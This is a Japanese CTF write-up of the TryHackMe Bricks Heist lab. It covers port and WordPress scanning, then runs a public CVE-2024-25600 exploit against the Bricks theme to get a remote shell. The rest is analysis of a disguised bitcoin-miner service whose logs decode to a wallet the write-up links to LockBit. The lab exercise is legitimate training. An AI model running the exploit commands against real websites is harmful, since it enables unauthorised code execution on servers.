# TryHack3M: Bricks Heist CTF

https://tryhackme.com/r/room/tryhack3mbricksheist

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.187.182

root@ip-10-10-255-214:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-26 03:00 GMT
Nmap scan report for 10.10.187.182
Host is up (0.0060s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
MAC Address: 02:FA:00:12:B9:DF (Unknown)
```

/etc/hosts にホスト追加して、https://bricks.thm/　でアクセスする。

### wpscan

```shell
$ sudo wpscan --url https://bricks.thm --enumerate  --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: https://bricks.thm/ [10.10.142.219]
[+] Started: Tue Jan 28 01:02:55 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:49 <========================================================================
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:04:14 <==================================> (2575 / 2575) 100.00% Time: 00:04:14

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:12 <=====================================> (137 / 137) 100.00% Time: 00:00:12

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:05 <===========================================> (75 / 75) 100.00% Time: 00:00:05

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:06 <================================> (100 / 100) 100.00% Time: 00:00:06

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <======================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] administrator
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - https://bricks.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Rss Generator (Aggressive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Jan 28 01:10:09 2025
[+] Requests Done: 3606
[+] Cached Requests: 13
[+] Data Sent: 976.301 KB
[+] Data Received: 22.808 MB
[+] Memory used: 287.355 MB
[+] Elapsed time: 00:07:14

```

```shell
$ nuclei -target http://bricks.thm

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.3.5

                projectdiscovery.io

[INF] nuclei-templates are not installed, installing...
[INF] Successfully installed nuclei-templates at /home/kali/.local/nuclei-templates
[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.3.5 (outdated)
[INF] Current nuclei-templates version: v10.1.2 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 52
[INF] Templates loaded for current scan: 8968
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Executing 8770 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1693 (Reduced 1591 Requests)
[INF] Using Interactsh Server: oast.online
[mysql-info] [javascript] [info] bricks.thm:3306 ["Version:","Transport: tcp"]
[ssh-auth-methods] [javascript] [info] bricks.thm:22 ["["publickey"]"]
[ssh-sha1-hmac-algo] [javascript] [info] bricks.thm:22
[ssh-server-enumeration] [javascript] [info] bricks.thm:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11"]
[mysql-detect] [tcp] [info] bricks.thm:3306
[openssh-detect] [tcp] [info] bricks.thm:22 ["SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11"]
[http-missing-security-headers:permissions-policy] [http] [info] http://bricks.thm
[http-missing-security-headers:x-content-type-options] [http] [info] http://bricks.thm
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://bricks.thm
[http-missing-security-headers:clear-site-data] [http] [info] http://bricks.thm
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://bricks.thm
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://bricks.thm
[http-missing-security-headers:strict-transport-security] [http] [info] http://bricks.thm
[http-missing-security-headers:content-security-policy] [http] [info] http://bricks.thm
[http-missing-security-headers:x-frame-options] [http] [info] http://bricks.thm
[http-missing-security-headers:referrer-policy] [http] [info] http://bricks.thm
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://bricks.thm
[tech-detect:python] [http] [info] http://bricks.thm
[caa-fingerprint] [dns] [info] bricks.thm
```

## CVE-2024-25600

WordPress Bricks Builder Theme <= 1.9.6 is vulnerable

https://github.com/Chocapikk/CVE-2024-25600

```shell
git clone https://github.com/Chocapikk/CVE-2024-25600
cd CVE-2024-25600

python3 -m venv myenv
source myenv/bin/activate
pip3 install -r ./requirements.txt

┌──(myenv)─(kali㉿kali)-[~/CTF/CVE-2024-25600]
└─$ python ./exploit.py -u https://bricks.thm
[*] Nonce found: b85436b144
[+] https://bricks.thm is vulnerable to CVE-2024-25600. Command output: apache
[!] Shell is ready, please type your commands UwU
#
```

シェルを取得できた。

```shell
# whoami
apache

# ls -al
total 260
drwxr-xr-x  7 apache apache  4096 Jan 28 05:52 .
drwxr-xr-x  3 root   root    4096 Apr  2  2024 ..
-rw-r--r--  1 apache apache   523 Apr  2  2024 .htaccess
-rw-r--r--  1 root   root      43 Apr  5  2024 650c844110baced87e1606453b93f22a.txt
-rw-r--r--  1 apache apache   405 Apr  2  2024 index.php
drwxr-xr-x  7 apache apache  4096 Apr 12  2023 kod
-rw-r--r--  1 apache apache 19915 Apr  4  2024 license.txt
drwxr-xr-x 15 apache apache  4096 Apr  2  2024 phpmyadmin
-rw-r--r--  1 apache apache  7401 Apr  4  2024 readme.html
-rw-r--r--  1 apache apache  7387 Apr  4  2024 wp-activate.php
drwxr-xr-x  9 apache apache  4096 Apr  2  2024 wp-admin
-rw-r--r--  1 apache apache   351 Apr  2  2024 wp-blog-header.php
-rw-r--r--  1 apache apache  2323 Apr  2  2024 wp-comments-post.php
-rw-r--r--  1 apache apache  3012 Apr  4  2024 wp-config-sample.php
-rw-rw-rw-  1 apache apache  3288 Apr  2  2024 wp-config.php
drwxr-xr-x  6 apache apache  4096 Jan 28 05:52 wp-content
-rw-r--r--  1 apache apache  5638 Apr  2  2024 wp-cron.php
drwxr-xr-x 30 apache apache 16384 Apr  4  2024 wp-includes
-rw-r--r--  1 apache apache  2502 Apr  2  2024 wp-links-opml.php
-rw-r--r--  1 apache apache  3927 Apr  2  2024 wp-load.php
-rw-r--r--  1 apache apache 50917 Apr  4  2024 wp-login.php
-rw-r--r--  1 apache apache  8525 Apr  2  2024 wp-mail.php
-rw-r--r--  1 apache apache 28427 Apr  4  2024 wp-settings.php
-rw-r--r--  1 apache apache 34385 Apr  2  2024 wp-signup.php
-rw-r--r--  1 apache apache  4885 Apr  2  2024 wp-trackback.php
-rw-r--r--  1 apache apache  3246 Apr  4  2024 xmlrpc.php

# cat 650c844110baced87e1606453b93f22a.txt
THM{fl46_6.....}
```

フラグ 1 ゲット

起動中のサービスの中で、ubuntu.service が怪しく、/lib/NetworkManager/nm-inet-dialog が実行ファイル。

```shell
# systemctl list-units --type=service --state=running
  ubuntu.service                                 loaded active running TRYHACK3M
.....
41 loaded units listed.

# systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```shell
# ls -al /lib/NetworkManager
total 8636
drwxr-xr-x   6 root root    4096 Apr  8  2024 .
drwxr-xr-x 148 root root   12288 Apr  2  2024 ..
drwxr-xr-x   2 root root    4096 Feb 27  2022 VPN
drwxr-xr-x   2 root root    4096 Apr  3  2024 conf.d
drwxr-xr-x   5 root root    4096 Feb 27  2022 dispatcher.d
-rw-r--r--   1 root root   48190 Apr 11  2024 inet.conf
-rwxr-xr-x   1 root root   14712 Feb 16  2024 nm-dhcp-helper
-rwxr-xr-x   1 root root   47672 Feb 16  2024 nm-dispatcher
-rwxr-xr-x   1 root root  843048 Feb 16  2024 nm-iface-helper
-rwxr-xr-x   1 root root 6948448 Apr  8  2024 nm-inet-dialog
-rwxr-xr-x   1 root root  658736 Feb 16  2024 nm-initrd-generator
-rwxr-xr-x   1 root root   27024 Mar 11  2020 nm-openvpn-auth-dialog
-rwxr-xr-x   1 root root   59784 Mar 11  2020 nm-openvpn-service
-rwxr-xr-x   1 root root   31032 Mar 11  2020 nm-openvpn-service-openvpn-helper
-rwxr-xr-x   1 root root   51416 Nov 27  2018 nm-pptp-auth-dialog
-rwxr-xr-x   1 root root   59544 Nov 27  2018 nm-pptp-service
drwxr-xr-x   2 root root    4096 Nov 27  2021 system-connections
```

inet.conf がログファイルになっている。

```shell
# head /lib/NetworkManager/inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a...
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
2024-04-08 10:46:14,751 [*] Miner()
2024-04-08 10:46:16,753 [*] Miner()
```

ID を 16 進 →ASCII 変換、さらに Base64 デコードを 2 回で、何かの文字列になった。

```shell
> python .\hex2str.py 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a...
WW....=

┌──(kali㉿kali)-[~/CTF]
└─$ echo WW....= | base64 -d
YmMxc....==

┌──(kali㉿kali)-[~/CTF]
└─$ echo WW....= | base64 -d | base64 -d
bc1qyk...bc1qyk...
```

bc1qyk... が 2 回繰り返されている。

これがウォレットアドレスということらしい。このウォレットに送金していた、bc1q5jqgm7.... 　を Google 検索すると、LockBit 関連だと分かった。

## 振り返り

- ウォレットアドレスが 2 回繰り返されているのに気づけず、ウォークスルーを見た。悔しい。ウォレットアドレスの桁数を調べたりできたはず。とは言え、あの時点では文字列がウォレットアドレスであろうという確信もなかった。
- 今回のサービス列挙の方法は役に立つのでツールボックスに入れる。
- 昔、Coursera のブロックチェーンの講座でトランザクションを見る機会があったが、実践的で良い復習になった。
- エクスプロイト以降はブルーチーム的な発想が必要になる良い内容だった。

## Tags

#tags:WordPress
